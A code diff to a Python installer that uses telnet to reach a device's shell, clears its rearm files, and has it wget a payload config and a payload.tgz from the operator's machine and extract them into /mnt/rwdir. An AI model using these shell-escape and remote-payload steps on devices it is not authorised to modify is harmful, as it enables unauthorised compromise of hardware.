@@ -595,8 +595,10 @@ def install(args):
                 print("[!] If this doesn't complete almost immediately, ensure there is no router between you and the device!")
                 print("[!] The stick MUST be able to connect back to this machine to retrieve the payload!")
                 print("[!] Also double check that there are no firewall rules blocking traffic to port 8172.\n")
-
+                
                 try:
+                    tn.sh_cmd("/system/shell")
+                    tn.sh_cmd("[ sh")
                     # ensure that if this goes Poorly we can power cycle our way out of it
                     tn.sh_cmd("touch /mnt/rwdir/disarmed")
                     tn.sh_cmd("[ -f /mnt/rwdir/setup.sh ] && rm /mnt/rwdir/setup.sh")
@@ -608,12 +610,14 @@ def install(args):
                     tn.sh_cmd("[ -f /mnt/rwdir/payload_auto_rearm ] && rm /mnt/rwdir/payload_auto_rearm")
 
                     print("[+] Disabled auto-rearming if it was previously enabled")
-
-                    try:
+                    
+                    try:   
                         assert "100%" in tn.sh_cmd(f"wget -O - {addr}:{port}/config > /mnt/rwdir/payload.cfg", 10)
                         print("[+] Stick retrieved payload configuration")
+                        #time.sleep(5)
 
-                        assert "100%" in tn.sh_cmd(f"wget -O - {addr}:{port}/payload.tgz | tar xvzf - -C /mnt/rwdir/", 10)
+                        #assert "100%" in tn.sh_cmd(f"wget -O - {addr}:{port}/stage0.sh > /mnt/rwdir/stage0.sh", 10)
+                        assert "100%" in tn.sh_cmd(f"wget -O - {addr}:80/payload.tgz | tar xvzf - -C /mnt/rwdir/", 10)
                         print("[+] Stick retrieved and extracted payload")
                     except (CigTimeout, AssertionError):
                         print("[-] Error: Stick was not able to connect back and download payload! Check firewall!")
